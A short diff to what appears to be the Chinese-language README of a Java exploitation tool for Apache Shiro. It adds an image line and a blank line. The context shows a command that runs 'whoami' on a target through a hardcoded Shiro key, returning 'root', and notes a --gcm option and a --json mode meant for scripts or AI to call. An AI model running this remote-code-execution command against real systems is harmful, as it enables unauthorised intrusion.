@@ -259,9 +259,12 @@ $ java -cp $JAR $CP exec -u $T -K "FcoRsBKe9XB3zOHbxTG0Lw==" -c "whoami" --cbc
 root
 ```
 
+![JSON 输出示例](images/09.png)
+
 GCM 模式的目标（Shiro >= 1.2.5）把上面命令里的 `--cbc` 换成 `--gcm`。
 
 需要被脚本或 AI 调的话加 `--json`。行首是 `{` 就按 JSON 解析日志元数据，否则是命令输出。
+
 
 ---
 
